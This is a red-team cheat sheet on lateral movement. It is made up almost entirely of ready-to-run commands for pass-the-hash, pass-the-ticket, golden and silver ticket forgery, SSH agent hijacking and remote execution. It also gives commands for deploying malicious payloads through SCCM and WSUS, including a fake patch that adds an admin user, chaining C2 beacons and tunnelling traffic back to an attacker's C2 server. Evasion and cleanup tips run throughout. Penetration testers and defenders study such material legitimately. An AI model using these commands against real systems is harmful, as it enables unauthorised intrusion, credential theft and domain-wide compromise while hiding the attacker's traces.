# __Lateral movement__
>Author: Pieter Miske
---
### __Verify access:__
##### _Verify found credentials:_
- Verify local credentials \([SharpCredCheck](https://github.com/pietermiske/SharpCredCheck)\): `SharpCredCheck.exe /username:<username> /password:<password> /local`
- Verify domain credentials \(SharpCredCheck\): `SharpCredCheck.exe /username:<username> /password:<password> /ad`
- Verify creds in another domain \(SharpCredCheck\): `SharpCredCheck.exe /username:<username> /password:<password> /domain:<FQDN> /dc:<IP or FQDN DC> /ad`
- Validate credentials and type of access on remote system (requires elevated privileges on the current system) \([SharpMapExec](https://github.com/cube0x0/SharpMapExec)\): `SharpMapExec ntlm <smb | winrm> /user:<username> [/ntlm:<ntlm hash> | /password:<password>] (/domain:<FQDN>) /computername:<FQDN target computer>`
- Validate creds via Kerberos \([impacket](https://github.com/SecureAuthCorp/impacket)\): `(proxychains4) getTGT.py <domain>/<usename> (-hashes :<NTLM>) -dc-ip <FQDN DC>`

##### _Verify local admin access:_
- 1\. Upload or create a file called 'computers\.txt' containing FQDN's of computers within the network to the directory 'C:\\users\\public\\documents\\' 
- 2\. Start scan (requires elevated privileges on the current system):
	- Using password \([SharpMapExec](https://github.com/cube0x0/SharpMapExec)\): `SharpMapExec kerberos <smb | winrm> /ticket:C:\Windows\<username>.kirbi /computername:C:\users\public\documents\computers.txt`
	- Using NTLM hash \(SharpMapExec\): `SharpMapExec ntlm smb /user:Administrator /ntlm:<local admin hash> /computername:C:\users\public\documents\computers.txt`

---
### __Change access:__
##### _Get domain access on a non\-domain joined system:_
- 1\. In the 'Network and Sharing Center' edit the Ethernet connection's 'Internet Protocol versie 4 \(TCP/Ipv4\)' item and enter in the "Use the following DNS server address" field the IP address of a DC in the target domain\.
- 2\. Start a new powershell session to interact with the domain from the context of a domain user \(requires valid credentials\): `runas /netonly /user:<domain>\<username> "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`
- 3\. It is now possible to run most tools with the privileges of the specified domain user

##### _Pass\-the\-Hash:_
Perform pth that will create a new process under the context of the provided credentials\.
>It is mandatory to run the SharpKatz command in an elevated session\.
- 1\. Start new process based on pth \([SharpKatz](https://github.com/b4rtik/SharpKatz)\): `SharpKatz.exe --Command pth --User <username> --Domain <domain> --NtlmHash <hash>`
- 2\. Migrate to the new process to use the provided user privileges\. 

##### _OverPass\-the\-hash:_
OverPass The Hash  can be used when NTLM is disabled or as a stealther approach for authorisation to objects within the domain\. A lot of tradecraft that leverages NTLM are undesirable and therefore always use AES256 keys\. 
>If the ticket is not working, try both the FQDN and the NetBIOS name of the target system\. 
- From CS Beacon \(this avoids any adverse effects and better OPSEC\):
	- 1\. \(optional\) if you have a password convert it to AES256 key \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe hash /password:<password> /domain:<FQDN> /user:<username> `
	- 2\. Request a new TGT \(Rubeus\): `Rubeus.exe asktgt /user:<USER> /domain:<FQDN of target domain> /aes256:<HASH> /opsec /nowrap (/dc:<FQDN DC>) `
	- 3\. Copy the TGT and save it locally on the CS client attacker system: `[System.IO.File]::WriteAllBytes("C:\Secrets\ticket.kirbi", [System.Convert]::FromBase64String("<base64 TGT string>"))`
	- 4\. Create a new/clean logon session \(make sure you are in a global writeable directory\): `make_token <domain>\<target user> DummyPass`
	- 5\. Create a sacrificial process: `run C:\Windows\System32\upnpcont.exe`
	- 6\. Find the PID of the new process: `ps`
	- 7\. Start a local TCP beacon listener in CS
	- 8\. Inject into the newly spawned process: `inject <PID> x64 <local TCP listener name>`
	- 9\. In the new spawned TCP beacon, import the TGT: `kerberos_ticket_use C:\<local path to>\ticket.kirbi`
- Create sacrificial process/logon session: this method will NOT overwrite the current TGT but requires elevated privileges on the current system:
	- 1\. Start sacrificial process/logon session:
		- Request TGT and import it directly in a sacrificial process/logon session \(Rubeus\): `Rubeus.exe asktgt /user:<username> /domain:<FQDN> /aes256:<aes256 key> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe`
		- Start empty sacrificial process/logon session \(use this to later import a kirbi ticket via rubeus ptt /ticket:<kirbi\.ticket>\) \(Rubeus\): `Rubues.exe createnetonly /program: C:\Windows\System32\cmd.exe`
	- 2\. Migrate to the created sacrificial process to use the requested TGT \(for PoshC2 use: migrate <pid>\)
- Import TGT in current Windows session \(this will overwrite the TGT of current user and will most likely be visable by the victim due authentication failures\) \(Rubeus\): `Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /ptt (/dc:<FQDN DC>) (/domain:<FQDN of target domain>)`
- Import TGT in current Linux session
	- 1\. Request ticket \(impacket\): `python getTGT.py <FQDN>/<USER> -aesKey <aes_key> -dc-ip <DC IP>`
	- 2\. Set the TGT for impacket use: `export KRB5CCNAME=<TGT_ccache_file>`
	- 3\. Use the TGT with \([impacket](https://github.com/SecureAuthCorp/impacket)\) suite and specify the ‘\-k’ and ‘\-no\-pass’ parameters\. 

##### _Pass\-The\-Ticket:_
Pass The Ticket attacks are similar to OverPass\-The\-Hash\. In this case instead of retrieving the ticket using a NTLM hash, AES key or password, the ticket is extracted from the host where the user is currently authenticated and can therefore be used as a form of session passing\.
- 1\. Check what TGT/TGS are stored in memory \(only shows other users TGT’s if elevated\) \([Rubeus](https://github.com/GhostPack/Rubeus)\): `Rubeus.exe triage`
- 2\. Extract ticket from current session or identified session if elevated \(Rubeus\): `Rubeus.exe dump /nowrap (/luid:<LUID value of other user>)`
- 3\. Import ticket:
	- In current session \(not elevated\) \(Rubeus\): `Rubeus.exe /ptt /ticket:<base64 ticket string>`
	- In new logon session \(elevated\): 
		- 1\. Create sacrificial logon session \(Rubeus\): `Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe`
		- 2\. Pass the TGT into the sacrificial logon session \(Rubeus\): `Rubeus.exe ptt /luid:<LUID of sacrificial logon session> /ticket:[<base64\ticket>]`

##### _Cobalt Strike: change user context techniques:_
- Steal a token from a specified process \(works well for accessing remote resources but not local ones\): `steal_token <PID>`
- Create an impersonation token into the current process based on provided credentials \(this will show as a logon type 9\) \(make sure you are in a global writeable directory\): `make_token (<domain>\)<username> <password>`
- Revert to beacon's original access token: `rev2self`
- Inject into process and leverage its context: `inject <PID> (<x86|x64>) <name TCP beacon listener>`

##### _PoshC2: process migration:_
- C\# Implant (when using a daisychain implant enter the name of the daisychain shellcode that was used during the daisychain setup): `migrate <PID>`
- PS Implant: `migrate -procid <PID>`

##### _Golden\-Ticket \(domain\-wide pass\):_
The KRBTGT account is used to encrypt and sign all Kerberos tickets within a domain and is also known as the Key Distribution Service account\. With control over this account, an attacker can generate Ticket Granting Tickets \(TGTs\) for any account in the domain\.*
>It is mandatory to have access to the krbtgt account AES/NTLM hash\. 
- 1\. Obtain domain SID \([SharpView](https://github.com/tevora-threat/SharpView)\): `Get-DomainSID`
- 2\. Forge golden ticket from local running Mimikatz instance (Mimikatz): `kerberos::golden /user:<user to impersonate (e.g. Administrator)> /domain:<domain FQDN> /sid:<domain SID> /aes256:<krbtgt hash> /ticket:ticket.kirbi (/startoffset:-10 /endin:600 /renewmax:10080)`
- 3\. Import the ticket and run command as the impersonated user:
	- Directly on the target system \(for cobalt strike use the make\_token \+ kerberos\_ticket\_use method\) \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe ptt /ticket:<path to ticket.kirbi> | <kirbi base64 string>`
	- On your attacking system:
		- 1\. \(optional\) In the case of a computer account, add its FQDN to your local '/etc/hosts' file
		- 2\. Set \.ccache ticket as environment variable: `export KRB5CCNAME=</path/to/Administrator.ccache>`
		- 3\. Make sure that your time is synchronized with the target DC to use kerberos
		- 4\. It is now possible to run tools in the context of  the impersonated user against a specific resource \(if you only control the service account\) or all resources \(if you control the computer account\)\. 

##### _Silver\-Ticket \(single computer pass\):_
While a golden ticket is a domain\-wide pass, the scope of a silver ticket is limited to a single computer resource which requires the computer\- or service account hash to forge a valid TGS\. Machine account hashes are rather uncrackable due to the machine account password being a random 120\+ bytes long string\. A silver ticket is therefore a good way of utilizing obtained machine account hashes\.
- 1\. Obtain the FQDN and domain SID \([SharpView](https://github.com/tevora-threat/SharpView)\): `Get-DomainSID`
- 2\. Forge silver ticket based on local running mimikatz instance \(mimikatz\): `kerberos::golden /user:<user to impersonate (e.g. Administrator)> /domain:<domain FQDN> /sid:<domain SID> /target:<target account name> /service:<target domain service (e.g. HOST)> /aes256:<machine key> /ticket:ticket.kirbi`
- 3\. Import the ticket and run command as the impersonated user:
	- Directly on the target system \(for cobalt strike use the make\_token \+ kerberos\_ticket\_use method\) \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe ptt /ticket:<path to ticket.kirbi> | <kirbi base64 string>`
	- On your attacking system:
		- 1\. \(optional\) In the case of a computer account, add its FQDN to your local '/etc/hosts' file
		- 2\. Set \.ccache ticket as environment variable: `export KRB5CCNAME=</path/to/Administrator.ccache>`
		- 3\. Make sure that your time is synchronized with the target DC to use kerberos
		- 4\. It is now possible to run tools in the context of  the impersonated user against a specific resource \(if you only control the service account\) or all resources \(if you control the computer account\)\. 

##### _SSH hijacking using SSH\-Agent and SSH Agent forwarding:_
>This attack requires root privileges on the current system\. 
- 1\. List all SSH connections: `ps aux | grep ssh`
- 2\. Get the process ID \(PID\) values for the SSH processes: `pstree -p <user> | grep ssh`
- 3\. List the content of the PID's environment bash file: `cat /proc/<number>/environ`
- 4\. Search for the variable 'SSH\_AUTH\_SOCK' and note the ssh session file to which it points
- 5\. Set SSH variable to own session: `SSH_AUTH_SOCK=</tmp/ssh-7OgTFiQJhL/agent.16380> ssh-add -l`
- 6\. Login to the target system leveraging the SSH session: `SSH_AUTH_SOCK=</tmp/ssh-7OgTFiQJhL/agent.16380> ssh <user>@victim`

##### _SSH hijacking leveraging ControlMaster:_
- 1\. Check in every accessible /home/user/\.ssh/controlmaster directory for the existence of SSH socket files \(e\.g\. user@victim:22\)
- 2\. If not already, su to the user that owns the socket file
- 3\. SSH hijack the session and gain access to the target system without specifying the user's password: `ssh <user>@<target system>`


---
### __Agentless RCE & starting a remote beacon:__
##### _Native Windows tools:_
- WinRS: run remote command: `winrs -r:<FQDN> (-u:<domain>\<username> -p:<password>) <COMMAND (e.g. powershell.exe -Command "pwd")>`
- wmic: run remote command: `wmic /node:"<target system name>" /user:<domain>\<username> /password:<password> process call create "cmd /c <command>"`
- Invoke\-WmiMethod: remotely run binary \(requires that the payload is already uploaded to the target system\): `Invoke-WmiMethod –ComputerName <FQDN target host> -Class win32_process -Namecreate -ArgumentList "C:\Users\Public\Documents\binary.exe"`
- PowerShell Remoting: run remote command: `$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(‘<domain>\<username>’, $SecPass); Invoke-Command -Computername <target FQDN> -Credential $Cred -ScriptBlock {<command to execute>}`

##### _Start RDP session:_
- Disable restricted admin access: `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
- Start RDP session from Linux system \(supports password and NTLM\): `xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM\-HASH> /v:<IP target> (/timeout:<time in ms to deal with high latency>)`

##### _Start SSH session:_
- Connect to SSH server: 
	- Regular login: `ssh <name>@<target ip>`
	- Use this syntax in the case when the ssh connection generates an error and requires “matching key exchange”: `ssh -okexAlgorithms=+<paste 1 shown key format from the error msg> -p <port> <name>@<target ip>`
- Login to domain joined Linux system using TGT:
	- 1\. Request TGT \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 getTGT.py <FQDN>/Administrator@<FQDN DC> -hashes :<HASH>`
	- 2\. Check location to where to locally store the TGT: `ssh -o GSSAPIAuthentication=yes user@domain.local -vv`
	- 3\. Copy ticket to correct location so SSH can import it: `cp user.ccache /tmp/krb5cc_1045`
	- 4\. Login over ssh using kerberos: `ssh -o GSSAPIAuthentication=yes <username>@<FQDN target Linux host>`

##### _Start WinRM session:_
- \([Evil\-WinRM](https://github.com/Hackplayers/evil-winrm)\): `evil-winrm -i <target ip> -u <username> (-p <password> | -H <NT hash>)`

##### _Abuse Microsoft System Centre Configuration Manager \(SCCM\) for lateral movement:_
SCCM is a Microsoft solution to administer systems across the organisation and for example push PowerShell sripts and commands to clients and start remote terminal sessions\. These functionalities are great for OPSEC friendly lateral movement and maybe even get access to segmented parts of the network\.
- 1\. From the context of an already compromised client/server, check if the CcmExec\.exe process is running which indicates that the client is managed by SCCM\. 
- 2\. Identify were the Distribution Point \(management server\) is for the current client \([MalSCCM](https://github.com/nettitude/MalSCCM)\): `MalSCCM.exe locate`
- 3\. It is now mandatory to get administrator level access \(e\.g\. SCCM administrator account, local administrator, DA\) to the Distribution Point server\. 
- 4\. From this new admin context, verify if the Distribution Point server is also the Primary Site \(if it returns group information it is the Primary Site\) \(MalSCCM\): `MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups`
- 5\. \(optional\) if the Primary Site is not found or no information is returned, it is required to get a beacon on the Distribution Point server and enumerate again \(MalSCCM\): `MalSCCM.exe locate`
- 6\. If you want to compromise a specific user or machine, enumeration can be done through SCCM \(MalSCCM\):
	- Enumerate computers: `MalSCCM.exe inspect /computers (/server:<PrimarySiteFQDN>)`
	- Enumerate Primary Users \(this will return a list of user login sessions and the corresponding computer\) \(MalSCCM\): `MalSCCM.exe inspect /primaryusers (/server:<PrimarySiteFQDN>)`
- 7\. Create a new computer group that blends in with the environments naming convention \(MalSCCM\): `MalSCCM.exe group /create /groupname:<new group name> /grouptype:device (/server:<PrimarySiteFQDN>)`
- 8\. Add the target computer\(s\) \(you want to access\) to the created group (MalSCCM): `MalSCCM.exe group /addhost /groupname:<created group> /host:<target computer name> (/server:<PrimarySiteFQDN>)`
- 9\. Verify if the target computer is in the new group \(MalSCCM\): `MalSCCM.exe inspect /groups (/server:<PrimarySiteFQDN>)`
- 10\. Create a \.EXE beacon payload and place it in a by Domain Computers accessible share on the network \(when SCCM is installed, a widely accessible share is exposed on Distribution Points called “\\\\<computername Distribution Points serve>\\SCCMContentLib$\\” \)
- 11\. Create a new hidden application that points to the malicious EXE \(MalSCCM\): `MalSCCM.exe app /create /name:<name new application (e.g. demoapp)> /uncpath:"\\<computername Distribution Points serve>\SCCMContentLib$\payload\.exe" (/server:<PrimarySiteFQDN>)`
- 12\. Verify if the application was created \(MalSCCM\): `MalSCCM.exe inspect /applications (/server:<PrimarySiteFQDN>)`
- 13\. Create an application deployment for the created group \(MalSCCM\): `MalSCCM.exe app /deploy /name:<name created application> /groupname:<new created group> /assignmentname:<new deployment name (e.g. demodeployment)> (/server:<PrimarySiteFQDN>)`
- 14\. Verify if the deployment was created \(MalSCCM\): `MalSCCM.exe inspect /deployments (/server:<PrimarySiteFQDN>)`
- 15\. Force the members of the created group to check in for an update which will execute payload\.exe as SYSTEM \(this can take some time and specialy for a natural check in\) \(MalSCCM\): `MalSCCM.exe checkin /groupname:<new created group> (/server:<PrimarySiteFQDN>)`
- 16\. After successful execution, clean up:
	- 1\. Remove the malicious payload\.exe from the share
	- 2\. Delete the created deployment and application \(MalSCCM\): `MalSCCM.exe app /cleanup /name:<name application> (/server:<PrimarySiteFQDN>)`
	- 3\. Delete the created group \(MalSCCM\): `MalSCCM.exe group /delete /groupname:<group name> (/server:<PrimarySiteFQDN>)`

##### _Abuse Windows Software Update Service \(WSUS\) for lateral movement:_
WSUS is a core part of Windows environments and is very often deployed in a way that would allow an attacker to use it to bypass internal networking restrictions\.
>A key consideration with WSUS lateral movement is that there is no way to control when a client checks in to fetch it's update\. You have to wait until patching day and that might happen once a day up to once a month\. Furthermore, the payload executable used must be signed by microsoft \(e\.g\. psexec\.exe, RunDLL32\.exe, MsBuild\.exe\)\. 
- 1\. From the context of an already compromised client/server, check if the WSUS is used \([SharpWSUS URL](https://github\.com/nettitude/SharpWSUS)\): `SharpWSUS.exe locate`
- 2\. Compromise the WSUS server and get local adminstrator access to the server
- 3\. Enumerate the WSUS deployment and identify the computers that are being managed and WSUS groups: `SharpWSUS.exe inspect`
- 4\. If using PsExec\.exe, upload it to disk of the WSUS server
- 5\. Create a malicious patch that will for example add a new local admin user: `SharpWSUS.exe create /payload:"C:\Users\Public\Documents\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user newadmin Password123! /add && net localgroup administrators newadmin /add\"" /title:"<update title>" /date:<2021-10-03>) (/kb:<500123> /rating:Important /description:<message about update> /url:https://microsoft.com`
- 6\. Create a new group, add a target computer \(e\.g\. DC\) to the group and approve the malicious patch for it: `SharpWSUS.exe approve /updateid:<returned update GUID from previous step> /computername:<FQDN target computer> /groupname:"<new group name>"`
- 7\. Verify if the group was created: `SharpWSUS.exe inspect`
- 8\. Now wait until the target computer request an update and track the update status in the meantime \(altough this isn't very reliable\) \(as long the update is not fetched the output will show 'Update info cannot be found'\): `SharpWSUS.exe check /updateid:<GUID update> /computername:<FQDN target computer>`
- 9\. Once the patch is installed, decline and delete the patch and remove the group: `SharpWSUS.exe delete /updateid:<GUID update> /computername:<FQDN target computer> /groupname:"<created group name>"`
- 10\. During step 5, a copy of the used signed Microsoft binary is placed in the webroot of the WSUS server\. Delete this binary and the one that was manually uploaded to disk\. 

##### _Remote command exection leveraging Pass-the-Hash:_
- Execute command via WMI \([Invoke\-WMIExec\.ps1](https://github.com/Kevin-Robertson/Invoke-TheHash)\): `Invoke-WMIExec -Target <target ip> -Domain <domain name>-Username <username> -Hash <NT hash> -Command "<command>" (-verbose)`
- Execute command via SMB \([Invoke\-SMBExec\.ps1](https://github.com/Kevin-Robertson/Invoke-TheHash)\): `Invoke-SMBExec -Target <target ip> -Domain <domain name>-Username <username> -Hash <NTLM hash> -Command "<command (e.g. PS EncodedLauncher or uploaded executable)>" -verbose`

##### _Remote command execution using RDP:_
- ([SharpRDP](https://github.com/0xthirteen/SharpRDP)\): `SharpRDP.exe computername=<FQDN target> command="<command>" username=<domain>\<username> password=<password> (<exec=cmd | exec=powershell | elevated=taskmgr>)`

##### _Start remote Cobalt Strike P2P beacon:_
This technique can be used to chain multiple beacons together\. This method is the equivalent of a bind shell\. 
>this method requires you to manually ‘connect’ to the SMB/TCP server started by the payload and therefore it is advised to only use this method if you have full control over the execution time of the payload\. 
- 1\. Start a new "Beacon TCP" or "Beacon SMB" listener
- 2\. Create a payload for the started listener
- 3\. Deliver the payload to the target system and execute it\.
- 4\. Connect to the started beacon from an already established beacon:
	- TCP Beacon: `connect <target ip> <port>`
	- SMB Beacon: `link <target ip> <pipe name>`

##### _Start remote CS Pivot P2P beacon:_
This technique can be used to chain multiple beacons together\. This method is handy in situations where you do not know when the payload will be executed\. This method is the equivalent of a reverse shell\.
>If the current machine doesn't allow arbitrary ports inbound and you can’t  modify the firewall, you can't use this type of listener\.
- 1\. Start the Pivot Listener from an already established beacon: Pivoting > Listener
- 2\. Create a payload for the started pivot listener \(normal workflow\)
- 3\. Make the payload execute via whatever method to auto start the new beacon\. 

##### _Start remote PoshC2 Daisy Chaining beacon:_
Daisy\-chaining can be used to pivot through a network over HTTP and create a chain of implants in PoshC2\. 
- 1\. Make sure your session is elevated
- 2\. Start a daisy server and follow the configuration wizard \(make sure the port is not in use\): `startdaisy`
- 3\. If you are running the daisy server in a C\# implant, it is mandatory to manually add an inbound firewall rule \(PS implant does this automatically\) \(use an opsec firewall rule name like "@\{Microsoft\.ADD\.Windows\.Controller\_1000\.14393\.0\.0\_neutral\_neutral\_cw5n1h2txyewy?ms\-resource://Microsoft\.ADD\.Windows\.Controller/PackageDisplayName\}"\): `netsh advfirewall firewall add rule name="<name of rule>" dir=in action=allow protocol=tcp localport=<port configured on daisyserver>`
- 4\. It is recommended to add portwarding with ‘netsh interface portproxy’ from the daisy server to the team server\. This way payloads can be hosted there\. 
- 5\. Use any RCE method to start a new beacon on the target computer using the daisy generated shellcode \(shellcode is by default not obfuscated but can be used with process hollowing without a problem if hosted remotely and reflectively loaded\)\. 

##### _Start remote PoshC2 SMB named pipe beacon:_
This technique can be used to pivot through a network via SMB and create a chain of implants for PoshC2\. 
- 1\. Create an obfuscated payload that leverages the by donut obfuscated PBind C\# shellcode from PoshC2
- 2\. Use any available technique to remotely download and run the payload 
- 3\. Connect to the SMB named pipe bind shell \(if you modified the pipename and secret in the config file specify both values\): `pbind_connect <hostname> (<pipename>) (<secret>)`



---
### __SOCKS proxy:__
##### _Cobalt Strike Socks Proxy:_
- 1\. In a beacon, start the SOCKS4a server and specify its port \(set sleep to 0\): `socks <port>`
- 2\. Use SOCKS Proxy:
	- Proxychains:
		- 1\. Configure proxychains, your browser or the SOCKS aware application to point to: 127\.0\.0\.1:1080
		- 2\. It is now possible to use the SOCKS proxy: `proxychains4 <normal syntax>`
	- Metasploit tunnel:
		- 1\. In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy, click the ‘Tunnel’ button and copy the generated string
		- 2\. Start msfconsole and paste the copied string
		- 3\. Most MSF modules are now auto proxied and only require the normal setup \(e\.g\. rhost\)\. 

##### _PoshC2 Socks Proxy_
This SOCKS proxy technique requires a PowerShell implant to work\. Overall very tricky to use: only works the first time you use it and if it fails, stop the socksproxy, kill beacon and start over\. 
- 1\. Get a powershell implant on the target host using your favorite execution method and set the beacon time to 1 sec\. 
- 2\. Start SharpSocks within the beacon \(if you start sharpsocks in a Daisy PS beacon, the URL that is requested must point to your downstream PS beacon \(e\.g\. http://10\.111\.10\.45:7580/\): `sharpsocks`
- 3\. Copy the printed sharpsocks string and paste it into a new terminal pane \(NOT into the PoshC2 implant handler\)\.
- 4\. Once you pasted the string and the server has started, type ‘Y’ into the implant handler window\. The output should indicate that the implant has started\. You can confirm this by looking at the output from the server you started in the previous step\. If it has started, you should see that the SOCKS Proxy is now listening \(most likely on 43334\)\.
- 5\. Configure proxychains or the SOCKS aware application to point to 127\.0\.0\.1:43334\.
- 6\. It is now possible to use the SOCKS proxy \(everything works via the socks proxy but its slow\): `proxychains4 <normal syntax>`
- 7\. \(optional\) Stop the SOCKS proxy: `stopsocks`

##### _Windows/Linux SOCKS5 Proxy with revsocks:_
This socks proxy technique can be used for establishing a connection between linux\-linux, linux\-windows and windows\-windows type systems\. 
- 1\. On your owned controlled \(C2\) server start the socks proxy server \([revsocks](https://github.com/kost/revsocks/releases)\):  `<revsocks | revsocks.exe> -listen <listener ip address>:<listening port> -socks 127.0.0.1:1080 -pass <password of your choosing>`
- 2\. Upload the revsocks\.exe binary to the target \(Windows or Unix based\) host and start the client to make a connection to the server: `<revsocks | revsocks.exe> -connect <remote server IP>:<port to connect to> -pass <set password> (-proxyauth <domain>/<username>:<password>) -useragent "<string (e.g. Mozilla 5.0/IE Windows 10)>"`
- 3\. Configure the “proxychains\.conf” file and add “socks5 <TAB> 127\.0\.0\.1:1080” so it uses SOCKS v5\.
- 4\. Use proxychains4 to connect to the internal network of the target system: `proxychains4 <command>`


---
### __Port forwarding:__
##### _Port forwarding based on port bending:_
>Port bending requires admin privileges to either add the necessary drivers or modify the firewall\.  Furthermore, this pretty much breaks any SMB service \(or other\) on the machine\. 
- \([PortBender](https://github.com/praetorian-inc/PortBender)\): this tool allows for port bending and only works for Cobalt Strike:
	- 1\. Start 2 beacons of which atleast 1 is running with high intergrity and use it for all below commands
	- 2\. Upload the WinDivert64\.sys driver to the “C:\\Windows\\System32\\drivers” folder\.
	- 3\. Load the “PortBender\.cna” Aggressor script: Cobalt Strike > Script Manager
	- 4\. Create a reverse port forward that will relay the traffic from port 8445 to port 445 on the Team Server: `rportfwd 8445 127.0.0.1 445`
	- 5\. Execute PortBender to redirect traffic from 445 to port 8445: `PortBender redirect 445 8445`
	- 6\. Stop port bending: 
		- 1\. Identify the JID of the PortBender job: `jobs`
		- 2\. Stop job: `jobkill <JID>`
		- 3\. Stop process: `kill <PID PortBender>`
- \([StreamDivert](https://github.com/jellever/StreamDivert/releases)\): this tool allows for port bending:
	- 1\. Start 2 high intergrity beacons on the pivot system of which at least one can run socksproxy\.
	- 2\. Create a config file named "config\.txt" and add the following content \(optional to edit the '0\.0\.0\.0' IP if you only want to redirect incomming traffic from a specific system\): `tcp < 445 0.0.0.0 -> <own ip> 445`
	- 3\. Upload the following StreamDivert files to the pivot system in the same folder \(this should not trigger AV\): StreamDivert\.exe / StreamDivert\.pdb / WinDivert64\.sys / WinDivert\.dll / config\.txt.
	- 4\. Run StreamDivert to start the port redirect \('\-f' will add 2 new firewall rules called "StreamDivert"\): `.\StreamDivert.exe config.txt -f (-v)`
	- 5\. Stop port bending:
		- 1\. Stop the 'StreamDivert' tool \(run from the other beacon\): 
			- 1: `tasklist /v |findstr "Stream"`
			- 2: `taskkill /f /pid <PID>`
		- 2\. Delete added firewall rules: `netsh advfirewall firewall delete rule name="StreamDivert"`
		- 3\. Delete all the uploaded tools \(it may require a system reboot to delete the \.sys driver\)

##### _Cobalt Strike port forwarding:_
- Tunnel traffic to Team Server:
	- 1\. Port forward incoming traffic on a specific port to a specific port on an arbitrary host: `rportfwd <bind port> <forward host> <forward port>`
	- 2\. Stop port forwarding: `rportfwd stop <bind port>`
- Tunnel traffic to the local machine running CS client: `rportfwd_local <bind port> 127.0.0.1 <forward port>`

##### _Windows native port forwarding:_
This method can be used to reach hosted payloads on the team server from a nested system in the network\. This requires admin privs to setup\. 
- 1\. Add portforwarding rule: `netsh interface portproxy add v4tov4 listenport=<local listening TCP port> connectaddress=<remote connect IP address> connectport=<remote TCP port>`
- 2\. Add a firewall rule so the portforward port can be reached: `netsh advfirewall firewall add rule name="<name of rule>" dir=in action=allow protocol=tcp localport=<listenport>`

##### _SSH port forwarding:_
- Dynamic Port Forwarding: Listen on local port 8080 \(can be any available port\)\. Incoming traffic to 127\.0\.0\.1:8080 forwards it to final destination via the SSH\-SERVER: 
	- 1: `ssh -D 127.0.0.1:8080 <username>@<IP SSH-SERVER>`
	- 2\. Configure ‘/etc/proxychains\.conf’ so it points to 127\.0\.0\.1:8080
	- 3\. Run tools through the SSH tunnel to reach local running services on the SSH\-SERVER or services on other systems in the nested network: `proxychains4 <normal tool syntax>` 
- Local Port Forwarding: Listen on local port 8080 and forward incoming traffic to REMOTE\-HOST:PORT via already compromised SSH\-SERVER \(can also be used to access local running services on SSH\-SERVER\): `ssh -L 127.0.0.1:8080:<IP REMOTE-HOST>:<TARGET PORT> <username>@<IP SSH-SERVER>`
- Remote Port Forwarding: Open port 5555 \(can be any available port\) on the compromised SSH\-SERVER\. Incoming traffic to SSH\-SERVER:5555 is tunnelled to your own system IP and specified port: `ssh -R 5555:<own IP or 127.0.0.1>:<port on own system to connect to> <username>@<IP SSH-SERVER>`

##### _Port forwarding with socat:_
- Linux socat:
	- 1\. Upload [socat](https://github.com/aledbf/socat-static-binary/releases/tag/v0.0.1) on the \(target\) system:
	- 2\. Run socat to forward all traffic to the target \(this method can also be used backwards to forward traffic from the target back to your C2 server through a redirector\): `sudo socat -d -d TCP4-LISTEN:80,fork TCP4:<ip target system>:<port to connect to>`
- Windows socat:
	- 1\. Upload all [widows socat](https://github.com/tech128/socat-1.7.3.0-windows) files to the \(target\) system
	- 2\. Run socat to forward all traffic on a specific port to a remote server: `.\socat.exe -d -d TCP4-LISTEN:<local port>,fork TCP4:<target ip>:<target port>`


